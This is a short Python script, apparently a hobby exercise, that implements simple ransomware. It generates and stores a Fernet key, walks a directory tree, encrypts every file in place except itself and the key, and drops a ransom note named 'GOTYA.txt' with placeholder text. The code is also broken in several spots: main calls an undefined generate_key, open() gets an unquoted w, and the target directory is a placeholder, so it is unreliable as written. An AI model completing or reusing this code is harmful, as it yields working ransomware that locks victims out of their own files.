#Nothing to do with supernatural spookyness
#Must have this installed
#Installation method varies with os
from cryptography.fernet import Fernet

import os


# Must create a key for cryptography
#wb write binary since not all files may be .txt
def key_create(): 
	key = Fernet.generate_key()
	with open("chave.key", "wb") as key_file:
		key_file.write(key)

# Nice to have easy access to the key when needed
#rb read binary
def keyLoad():
	return open("chave.key", "rb").read()

# Function to cryptograph a file
def crypt(arq, key):
	f = Fernet(key)
	with open(arq, "rb") as file:
		data = file.read()
	cryp_data = f.encrypt(data)
	with open(arq, "wb") as file:
		file.write(cryp_data)

# Create a file list to be cryptographed
def listing(dir):
	list = []
	for root, _, files in os.walk(dir):
		for name in files:
			pat = os.path.join(root, name)
			#Change name based on this file, this file should not be cryptographed
			#Neither the key
			if name!= "crypt.py" and not name.endswith(".key"):
				list.append(pat)

	return list

# Create a file about the rescue of the data
#Just w cause it will be a txt
def ransom():
	with open("GOTYA.txt", w) as f:
		f.write("Insert 2 bit villain line \n")
		f.write("Insert demand that will surely solve everything \n")
		f.write("LOL YEAH NOPE \n")

#Note a intended error in directory, to be generic
def main():
	generate_key()
	key = keyLoad()
	arqs = listing("Insert current directory")
	for arq in arqs:
		crypt(arq, key)
	ransom()
	print("Code executed successfully")

#First time i saw this but it is interesting
if __name__=="__main__":
    main()
